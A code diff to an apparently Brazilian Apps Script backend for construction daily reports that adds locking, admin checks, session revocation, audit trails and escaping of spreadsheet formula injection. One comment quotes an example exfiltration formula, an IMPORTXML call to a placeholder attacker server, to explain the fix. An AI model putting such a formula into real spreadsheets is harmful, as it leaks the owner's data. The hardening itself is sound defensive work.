@@ -98,6 +98,34 @@ function rotear(e) {
         return responder(negarPorObra(p.token, action, p.obra), p.callback);
       }
     }
+    /* CONCORRÊNCIA. Metade das escritas já pega LockService (addBatchRDO,
+       equipApontar, upsertRDODiario, deleteRDODiario, limparDuplicados,
+       apagarPorPrefixoId). A outra metade opera por ÍNDICE DE LINHA lido de
+       um snapshot — `getDataRange().getValues()`, acha a linha i, e depois
+       `deleteRow(i)` / `setValue` / `getLastRow()+1`. Entre a leitura e a
+       escrita, outra execução pode ter inserido ou apagado linha: o índice
+       envelhece e a gravação cai na linha errada.
+
+       Não é hipótese: quando o 4G volta, o `outboxFlush` do app dispara os
+       itens da fila em sequência rápida, e duas `nfSalvar` disputando
+       `getLastRow()+1` gravam uma por cima da outra.
+
+       A trava vai aqui, no roteador, e só para as ações que ainda NÃO têm a
+       sua — pegar de novo uma trava já tomada dentro da mesma execução é o
+       tipo de coisa que só se descobre em produção. */
+    var SEM_TRAVA_PROPRIA = ['deleteRDO', 'updateRDO', 'rdoFoto', 'equipApagar',
+                             'nfSalvar', 'nfExcluir', 'saidaSalvar', 'saidaExcluir'];
+    var travaRoteador = null;
+    if (SEM_TRAVA_PROPRIA.indexOf(action) !== -1) {
+      travaRoteador = LockService.getScriptLock();
+      try {
+        travaRoteador.waitLock(30000);
+      } catch (eLock) {
+        travaRoteador = null;
+        return responder({ ok: false, error: 'Servidor ocupado gravando outro lançamento. Tente de novo.' }, p.callback);
+      }
+    }
+    try {
     switch (action) {
       // `recursos` diz ao app o que ESTA versão do backend sabe fazer. Sem
       // isso, o app só descobria tentando — e tentar guardar a folha 2 num
@@ -109,8 +137,10 @@ function rotear(e) {
       case 'deleteRDO':       resp = deleteRDO(p.id, p.token); break;
       case 'addBatchRDO':     resp = addBatchRDO(p.batch, p.clientId, p.token); break;
       case 'updateRDO':       resp = updateRDO(p.payload, p.token); break;
-      case 'limparDuplicados': resp = limparDuplicadosServidor(); break;
-      case 'apagarPorPrefixoId': resp = apagarPorPrefixoId(p.prefixo); break;
+      // As duas reescrevem a aba RDO_Avanco INTEIRA — que é a base da medição.
+      // Vão com o token, e lá dentro exigem admin de verdade e deixam rastro.
+      case 'limparDuplicados': resp = limparDuplicadosServidor(p.token); break;
+      case 'apagarPorPrefixoId': resp = apagarPorPrefixoId(p.prefixo, p.token); break;
       case 'producaoPorPacote': resp = producaoPorPacote(p.mes, p.obra); break;
       case 'addRDODiario':    resp = upsertRDODiario(p, false); break;
       case 'updateRDODiario': resp = upsertRDODiario(p, true); break;
@@ -141,6 +171,9 @@ function rotear(e) {
       default:
         // NUNCA inserir nada aqui. Ação desconhecida = erro, e ponto.
         resp = { ok: false, error: 'Ação desconhecida: "' + action + '"' };
+    }
+    } finally {
+      if (travaRoteador) travaRoteador.releaseLock();
     }
   } catch (err) {
     resp = { ok: false, error: String(err && err.message ? err.message : err) };
@@ -296,6 +329,36 @@ function sessaoRevogar(token) {
   return { ok: true };
 }
 
+/* -------------------------------------------------------------------
+   Derruba TODAS as sessões de um usuário.
+   -------------------------------------------------------------------
+   A sessão guarda perfil e obras no momento do login e nunca reconsulta a
+   propriedade USUARIOS. Sem isto, excluir alguém, rebaixar o perfil ou
+   trocar a senha não tinha efeito nenhum sobre quem já estava dentro: o
+   token continuava valendo, com o perfil ANTIGO, até alguém clicar em Sair
+   — que é justamente o que o demitido não vai fazer.
+   ------------------------------------------------------------------- */
+function sessoesDoUsuarioRevogar(nome, motivo) {
+  var alvo = String(nome == null ? '' : nome).trim().toLowerCase();
+  if (!alvo) return 0;
+  var props = PropertiesService.getScriptProperties();
+  var todas = props.getProperties();
+  var n = 0;
+  Object.keys(todas).forEach(function (k) {
+    if (k.indexOf(SESSAO_PREFIXO) !== 0) return;
+    var s;
+    try { s = JSON.parse(todas[k]); } catch (e) { return; }
+    var dono = String((s && (s.u || s.usuario)) || '').trim().toLowerCase();
+    if (dono !== alvo) return;
+    try { props.deleteProperty(k); } catch (e) {}
+    try { CacheService.getScriptCache().remove('tok_' + k.slice(SESSAO_PREFIXO.length)); } catch (e) {}
+    n++;
+  });
+  if (n) registrarAuditoria('sistema', 'admin', 'SESSOES_REVOGADAS', OBRA_ID, nome, '',
+    n + ' sessão(ões) derrubada(s) · ' + (motivo || ''));
+  return n;
+}
+
 /* Remove sessões abandonadas. Roda sozinha pelo gatilho diário. */
 function limparSessoesAbandonadas() {
   // Aproveita a faxina para descer a trilha de login/logout que ainda não
@@ -348,6 +411,45 @@ function podeApagarLinha(token, donoDaLinha) {
   var dele = String(donoDaLinha == null ? '' : donoDaLinha).trim();
   if (!meu || !dele) return false;            // registro sem dono: só o admin
   return dele.toLowerCase() === String(meu).trim().toLowerCase();
+}
+
+/* Exige perfil de administrador DE VERDADE, mesmo com EXIGIR_TOKEN desligado.
+   `ehAdminToken` devolve true quando a proteção está desligada — o que é certo
+   para o modo de implantação, e errado para operação em MASSA sobre a base da
+   medição. Aqui a porta é fechada nos dois casos. */
+function exigirAdminEstrito(token, acao) {
+  var exigir = PropertiesService.getScriptProperties().getProperty('EXIGIR_TOKEN');
+  if (String(exigir).toLowerCase() !== 'true') {
+    return { ok: false, error: 'Operação em massa exige EXIGIR_TOKEN = true nas Propriedades do script.' };
+  }
+  if (!sessaoDoToken(token)) return { ok: false, error: 'TOKEN_INVALIDO' };
+  if (perfilDoToken(token) !== 'admin') {
+    registrarAuditoria(usuarioDoToken(token) || '?', perfilDoToken(token) || '?',
+      'NEGADO:' + acao, '', '', '', 'perfil sem permissão para operação em massa');
+    return { ok: false, error: 'SEM_PERMISSAO' };
+  }
+  return null;
+}
+
+/* -------------------------------------------------------------------
+   seguro() — texto do cliente nunca vira FÓRMULA na planilha
+   -------------------------------------------------------------------
+   setValue/setValues do Apps Script interpretam string começando com "="
+   como fórmula. Uma observação de RDO escrita como
+   =IMPORTXML("http://servidor-do-atacante/?x"&A1) roda com a conta do DONO
+   da planilha e vaza o conteúdo dela. O apóstrofo à frente força texto e NÃO
+   aparece para quem lê a célula, nem no CSV publicado — é o mesmo truque que
+   a `chave` da nota fiscal já usava.
+   ------------------------------------------------------------------- */
+function seguro(v) {
+  if (typeof v !== 'string') return v;
+  return /^[=+\-@]/.test(v) ? "'" + v : v;
+}
+function seguroLinha(arr) {
+  return arr.map(function (v) { return seguro(v); });
+}
+function seguroMatriz(m) {
+  return m.map(function (linha) { return seguroLinha(linha); });
 }
 
 function exigirTokenSeAtivo(token) {
@@ -745,7 +847,7 @@ function addBatchRDO(batchJson, clientId, token) {
       });
     });
 
-    aba.getRange(aba.getLastRow() + 1, 1, linhas.length, cab.length).setValues(linhas);
+    aba.getRange(aba.getLastRow() + 1, 1, linhas.length, cab.length).setValues(seguroMatriz(linhas));
     registrarAuditoria(sess.usuario, sess.perfil, 'addBatchRDO', OBRA_ID, clientId || '', '',
       linhas.length + ' serviço(s) gravado(s)');
     return { ok: true, inserted: linhas.length };
@@ -966,7 +1068,7 @@ function appendObj(nomeAba, obj) {
   var reg = {};
   Object.keys(obj).forEach(function (k) { reg[k.toLowerCase()] = obj[k]; });
   var linha = cab.map(function (nc) { return reg.hasOwnProperty(nc) ? reg[nc] : ''; });
-  a.getRange(a.getLastRow() + 1, 1, 1, cab.length).setValues([linha]);
+  a.getRange(a.getLastRow() + 1, 1, 1, cab.length).setValues([seguroLinha(linha)]);
 }
 
 function equipListar() {
@@ -1215,7 +1317,9 @@ function producaoPorPacote(mes, obra) {
 //   Data + Turno + Pacote_ID + Quantidade + Apontador + Local_Estaca
 // Retorna quantas linhas removeu — uma única chamada resolve milhares.
 // ------------------------------------------------------------
-function limparDuplicadosServidor() {
+function limparDuplicadosServidor(token) {
+  var negado = exigirAdminEstrito(token, 'limparDuplicados');
+  if (negado) return negado;
   var lock = LockService.getScriptLock();
   lock.waitLock(120000);
   try {
@@ -1268,6 +1372,14 @@ function limparDuplicadosServidor() {
       }
     }
 
+    // Operação em massa sobre a base da medição tem de deixar rastro. Estas
+    // duas eram as únicas escritas do backend que reescreviam a aba inteira
+    // sem uma linha na Auditoria — e num log de auditoria o que não foi
+    // registrado não aconteceu.
+    registrarAuditoria(usuarioDoToken(token) || '?', perfilDoToken(token) || '?',
+      'limparDuplicados', '', '', 'linhas antes: ' + (dados.length - 1),
+      'removidas: ' + removidas + ' · restantes: ' + (manter.length - 1) + ' · backup: ' + nomeBackup);
+
     return { ok: true, removidas: removidas, total: dados.length - 1, restantes: manter.length - 1, backup: nomeBackup };
   } catch (err) {
     return { ok: false, error: String(err && err.message ? err.message : err) };
@@ -1282,8 +1394,10 @@ function limparDuplicadosServidor() {
 // reenrios criaram lixo num dia específico que você quer zerar.
 // Faz backup antes. Chamada: ?action=apagarPorPrefixoId&prefixo=20260530
 // ------------------------------------------------------------
-function apagarPorPrefixoId(prefixo) {
+function apagarPorPrefixoId(prefixo, token) {
   if (!prefixo) return { ok: false, error: 'prefixo não informado' };
+  var negado = exigirAdminEstrito(token, 'apagarPorPrefixoId');
+  if (negado) return negado;
   var lock = LockService.getScriptLock();
   lock.waitLock(120000);
   try {
@@ -1314,6 +1428,10 @@ function apagarPorPrefixoId(prefixo) {
       if (nLinhas > 1) aba.getRange(2, 1, nLinhas - 1, nCols).clearContent();
       if (manter.length > 1) aba.getRange(2, 1, manter.length - 1, manter[0].length).setValues(manter.slice(1));
     }
+
+    registrarAuditoria(usuarioDoToken(token) || '?', perfilDoToken(token) || '?',
+      'apagarPorPrefixoId', '', String(prefixo), 'linhas antes: ' + (dados.length - 1),
+      'removidas: ' + removidas + ' · restantes: ' + (manter.length - 1) + ' · backup: ' + nomeBackup);
 
     return { ok: true, removidas: removidas, total: dados.length - 1, restantes: manter.length - 1, backup: nomeBackup };
   } catch (err) {
@@ -1356,7 +1474,7 @@ function updateRDO(payloadJson, token) {
         var col = idxColuna(cab, chave.toLowerCase());
         if (col !== -1 && col !== iId) {
           antes.push(chave + '=' + dados[i][col]);
-          aba.getRange(i + 1, col + 1).setValue(payload[chave]);
+          aba.getRange(i + 1, col + 1).setValue(seguro(payload[chave]));
         }
       });
       registrarAuditoria(usuarioDoToken(token), perfil, 'updateRDO', OBRA_ID, id,
@@ -1389,11 +1507,13 @@ function upsertRDODiario(p, deveExistir) {
   }
 
   garantirColuna(aba, 'obra');   // antes de ler o cabeçalho, para já vir nele
+  garantirColuna(aba, 'numero_rdo');  // o número que a fiscalização lê, por obra
     var cab = cabecalhoNormalizado(aba);
     var iData = idxColuna(cab, 'data');
     var iTurno = idxColuna(cab, 'turno');
     var iId = idxColuna(cab, 'id');
     var iObra = idxColuna(cab, 'obra');
+    var iNum = idxColuna(cab, 'numero_rdo');
     var dados = aba.getDataRange().getValues();
 
     var dataAlvo = normData(p.data);
@@ -1427,9 +1547,15 @@ function upsertRDODiario(p, deveExistir) {
         var idAtual = String(dados[linhaExistente - 1][iId] == null ? '' : dados[linhaExistente - 1][iId]).trim();
         if (!idAtual) registro['id'] = gerarIdDiario(dados, iId);
       }
+      // Backfill do número na linha antiga que ainda não o tem (mesmo efeito
+      // de migrarNumeroRdoPorObra, sem depender de alguém rodá-la).
+      if (iNum !== -1 && !registro['numero_rdo']) {
+        var numAtual = String(dados[linhaExistente - 1][iNum] == null ? '' : dados[linhaExistente - 1][iNum]).trim();
+        if (!numAtual) registro['numero_rdo'] = proximoNumeroRdo(dados, iNum, iObra, obraAlvo);
+      }
       cab.forEach(function (nomeCol, idx) {
         if (registro.hasOwnProperty(nomeCol)) {
-          aba.getRange(linhaExistente, idx + 1).setValue(registro[nomeCol]);
+          aba.getRange(linhaExistente, idx + 1).setValue(seguro(registro[nomeCol]));
         }
       });
       registrarAuditoria(sessD && sessD.usuario, sessD && sessD.perfil, 'updateRDODiario', OBRA_ID,
@@ -1440,10 +1566,15 @@ function upsertRDODiario(p, deveExistir) {
       if (iId !== -1 && !registro['id']) {
         registro['id'] = gerarIdDiario(dados, iId);
       }
+      // E com o NÚMERO do RDO contado dentro da obra — o `id` é chave técnica
+      // global, o número é o que sai impresso para a fiscalização.
+      if (iNum !== -1 && !registro['numero_rdo']) {
+        registro['numero_rdo'] = proximoNumeroRdo(dados, iNum, iObra, obraAlvo);
+      }
       var linha = cab.map(function (nomeCol) {
         return registro.hasOwnProperty(nomeCol) ? registro[nomeCol] : '';
       });
-      aba.getRange(aba.getLastRow() + 1, 1, 1, cab.length).setValues([linha]);
+      aba.getRange(aba.getLastRow() + 1, 1, 1, cab.length).setValues([seguroLinha(linha)]);
       registrarAuditoria(sessD && sessD.usuario, sessD && sessD.perfil, 'addRDODiario', OBRA_ID,
         registro['id'] || dataAlvo, '', 'data ' + dataAlvo + ' turno ' + (turno || '-'));
       return { ok: true, inserted: true, id: registro['id'] || '' };
@@ -1478,6 +1609,70 @@ function gerarIdDiario(dados, iId) {
     if (m) { var n = parseInt(m[1], 10); if (!isNaN(n) && n > max) max = n; }
   }
   return 'D' + ('0000' + (max + 1)).slice(-4);
+}
+
+/* -------------------------------------------------------------------
+   NÚMERO DO RDO — por obra, e separado do `id`
+   -------------------------------------------------------------------
+   O número impresso no cabeçalho do RDO oficial saía do `id` (D####), que
+   `gerarIdDiario` gera varrendo a aba INTEIRA. Mas a aba RDO_Diario é
+   compartilhada por todas as obras: o primeiro RDO de uma obra nova sairia
+   numerado na sequência da Teotônio — "RDO nº 87" no primeiro dia de obra —
+   e as duas obras teriam numerações entrelaçadas no mesmo documento oficial.
+
+   A separação é em dois papéis:
+     `id`         chave TÉCNICA, global e única (é por ela que o app apaga e
+                  edita a linha). Continua exatamente como estava.
+     `numero_rdo` o número que a fiscalização lê. Conta por OBRA, do 1.
+
+   Os RDOs que a Teotônio já emitiu mantêm o número que já foi impresso: a
+   migração copia o número derivado do `id` atual, em vez de renumerar por
+   data. Documento entregue à fiscalização não muda de número.
+   ------------------------------------------------------------------- */
+function proximoNumeroRdo(dados, iNum, iObra, obraAlvo) {
+  var max = 0;
+  for (var i = 1; i < dados.length; i++) {
+    if (iObra !== -1 && normObra(dados[i][iObra]) !== obraAlvo) continue;
+    var n = parseInt(String(dados[i][iNum] == null ? '' : dados[i][iNum]).replace(/\D/g, ''), 10);
+    if (!isNaN(n) && n > max) max = n;
+  }
+  return max + 1;
+}
+
+/* Roda 1× no editor, depois de colar este Code.gs.
+   Preenche `numero_rdo` no que já existe, PRESERVANDO o número que cada RDO
+   já mostrava (o derivado do id). Só a Teotônio tem histórico, então na
+   prática ela fica idêntica ao que já foi impresso e qualquer obra nova
+   começa do 1. Rodar de novo é seguro: só preenche o que estiver vazio. */
+function migrarNumeroRdoPorObra() {
+  var aba = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(NOME_ABA_DIARIO);
+  if (!aba) return { ok: false, error: 'Aba "' + NOME_ABA_DIARIO + '" não encontrada' };
+  garantirColuna(aba, 'obra');
+  garantirColuna(aba, 'numero_rdo');
+  var cab = cabecalhoNormalizado(aba);
+  var iId = idxColuna(cab, 'id');
+  var iObra = idxColuna(cab, 'obra');
+  var iNum = idxColuna(cab, 'numero_rdo');
+  if (iNum === -1) return { ok: false, error: 'Coluna numero_rdo não criada' };
+
+  var dados = aba.getDataRange().getValues();
+  var preenchidos = 0;
+  var porObra = {};   // obra -> maior número já visto, para as linhas sem id
+  for (var i = 1; i < dados.length; i++) {
+    if (String(dados[i][iNum] == null ? '' : dados[i][iNum]).trim() !== '') continue;
+    var obra = iObra !== -1 ? normObra(dados[i][iObra]) : OBRA_ID;
+    var numero = 0;
+    if (iId !== -1) {
+      var m = String(dados[i][iId] == null ? '' : dados[i][iId]).match(/(\d+)/);
+      if (m) numero = parseInt(m[1], 10);
+    }
+    if (!numero || isNaN(numero)) numero = (porObra[obra] || 0) + 1;
+    porObra[obra] = Math.max(porObra[obra] || 0, numero);
+    aba.getRange(i + 1, iNum + 1).setValue(numero);
+    preenchidos++;
+  }
+  Logger.log('numero_rdo preenchido em ' + preenchidos + ' linha(s): ' + JSON.stringify(porObra));
+  return { ok: true, preenchidos: preenchidos, porObra: porObra };
 }
 
 // ------------------------------------------------------------
@@ -2027,10 +2222,26 @@ function usuarioSalvar(p) {
   mapa[nome] = { senha: senhaFinal, perfil: perfil, obras: obrasFinal };
   usuariosGravar(mapa);
 
+  /* A sessão carrega perfil e obras congelados do login. Trocar a senha,
+     rebaixar o perfil, renomear ou restringir obras não valia nada enquanto
+     o token antigo continuasse aceito — a pessoa seguia com o acesso velho.
+     Quem mudou de fato é derrubado e entra de novo; quem só teve o cadastro
+     tocado sem mudar nada disso continua onde está.
+     Exceção: o próprio admin que está mexendo não se derruba, senão ele perde
+     a tela no meio do trabalho. */
+  var derrubadas = 0;
+  var mudouAcesso = !!senha || (editando && (perfil !== perfilAnterior || nomeAntigo !== nome ||
+    JSON.stringify(usuarioObrasDe(mapa[nome])) !== JSON.stringify(obrasFinal)));
+  if (editando && mudouAcesso) {
+    if (nomeAntigo !== eu) derrubadas += sessoesDoUsuarioRevogar(nomeAntigo, 'cadastro alterado');
+    if (nome !== nomeAntigo && nome !== eu) derrubadas += sessoesDoUsuarioRevogar(nome, 'cadastro alterado');
+  }
+
   registrarAuditoria(eu, 'admin', editando ? 'usuarioAlterar' : 'usuarioCriar', OBRA_ID, nome,
     editando ? (nomeAntigo + ' · ' + perfilAnterior) : '',
-    nome + ' · ' + perfil + (senha ? ' · senha trocada' : ''));
-  return { ok: true, nome: nome, perfil: perfil };
+    nome + ' · ' + perfil + (senha ? ' · senha trocada' : '') +
+    (derrubadas ? ' · sessões derrubadas: ' + derrubadas : ''));
+  return { ok: true, nome: nome, perfil: perfil, sessoesDerrubadas: derrubadas };
 }
 
 function usuarioExcluir(p) {
@@ -2047,8 +2258,11 @@ function usuarioExcluir(p) {
 
   delete mapa[nome];
   usuariosGravar(mapa);
-  registrarAuditoria(eu, 'admin', 'usuarioExcluir', OBRA_ID, nome, '', '');
-  return { ok: true, removido: true };
+  // Sem isto, o excluído seguia dentro do sistema com o token que já tinha.
+  var derrubadas = sessoesDoUsuarioRevogar(nome, 'usuário excluído');
+  registrarAuditoria(eu, 'admin', 'usuarioExcluir', OBRA_ID, nome, '',
+    'sessões derrubadas: ' + derrubadas);
+  return { ok: true, removido: true, sessoesDerrubadas: derrubadas };
 }
 
 // Utilitário de migração (rodar 1× no editor): converte as senhas em texto da
@@ -2173,7 +2387,12 @@ function nfSalvar(p) {
     paginas: pagsTxt,
     leitura: typeof p.leitura === 'string' ? p.leitura : JSON.stringify(p.leitura || {}),
     historico: typeof p.historico === 'string' ? p.historico : JSON.stringify(p.historico || []),
-    usuario: p.usuario || usuarioDoToken(p.token) || '',
+    /* O DONO vem do TOKEN, nunca do que o cliente declarou. Este campo é o
+       que a regra "só admin ou quem lançou apaga" consulta e o que vai para a
+       Auditoria: aceitar `p.usuario` era deixar qualquer um assinar em nome de
+       outro — e apagar o registro alheio. Só cai no que veio do cliente quando
+       não há sessão (EXIGIR_TOKEN desligado), que é o modo de implantação. */
+    usuario: usuarioDoToken(p.token) || p.usuario || '',
     criadoem: p.criadoem || Date.now(),
     atualizadoem: Date.now()
   };
@@ -2192,9 +2411,9 @@ function nfSalvar(p) {
     if (iDlk !== -1 && !reg.drivelink) linha[iDlk] = dados[achou][iDlk];
     // reenvio da nota SEM a lista de páginas não pode apagar as que já subiram
     if (iPag !== -1 && !temPaginas) linha[iPag] = dados[achou][iPag];
-    a.getRange(achou + 1, 1, 1, cab.length).setValues([linha]);
+    a.getRange(achou + 1, 1, 1, cab.length).setValues([seguroLinha(linha)]);
   } else {
-    a.getRange(a.getLastRow() + 1, 1, 1, cab.length).setValues([linha]);
+    a.getRange(a.getLastRow() + 1, 1, 1, cab.length).setValues([seguroLinha(linha)]);
   }
   registrarAuditoria(reg.usuario, 'app', achou > -1 ? 'nfAlterar' : 'nfCadastrar', reg.obra, clientId, '', 'NF ' + reg.numero + ' · ' + reg.status + ' · R$ ' + reg.vtotal);
   return { ok: true, id: reg.id, clientId: clientId, atualizado: achou > -1 };
@@ -2415,7 +2634,12 @@ function saidaSalvar(p) {
     rua: p.rua || '',
     responsavel: p.responsavel || '',
     obs: p.obs || '',
-    usuario: p.usuario || usuarioDoToken(p.token) || '',
+    /* O DONO vem do TOKEN, nunca do que o cliente declarou. Este campo é o
+       que a regra "só admin ou quem lançou apaga" consulta e o que vai para a
+       Auditoria: aceitar `p.usuario` era deixar qualquer um assinar em nome de
+       outro — e apagar o registro alheio. Só cai no que veio do cliente quando
+       não há sessão (EXIGIR_TOKEN desligado), que é o modo de implantação. */
+    usuario: usuarioDoToken(p.token) || p.usuario || '',
     criadoem: p.criadoem || Date.now()
   };
   var linha = cab.map(function (nc) { return reg.hasOwnProperty(nc) ? reg[nc] : ''; });
@@ -2425,8 +2649,8 @@ function saidaSalvar(p) {
       if (String(dados[i][iId]).trim() === String(reg.id).trim()) { achou = i; break; }
     }
   }
-  if (achou > -1) a.getRange(achou + 1, 1, 1, cab.length).setValues([linha]);
-  else a.getRange(a.getLastRow() + 1, 1, 1, cab.length).setValues([linha]);
+  if (achou > -1) a.getRange(achou + 1, 1, 1, cab.length).setValues([seguroLinha(linha)]);
+  else a.getRange(a.getLastRow() + 1, 1, 1, cab.length).setValues([seguroLinha(linha)]);
   registrarAuditoria(reg.usuario, perfilDoToken(p.token), achou > -1 ? 'saidaAlterar' : 'saidaRegistrar',
     reg.obra, reg.id, '', reg.descricao + ' - ' + reg.qtd + ' ' + reg.un);
   return { ok: true, id: reg.id };
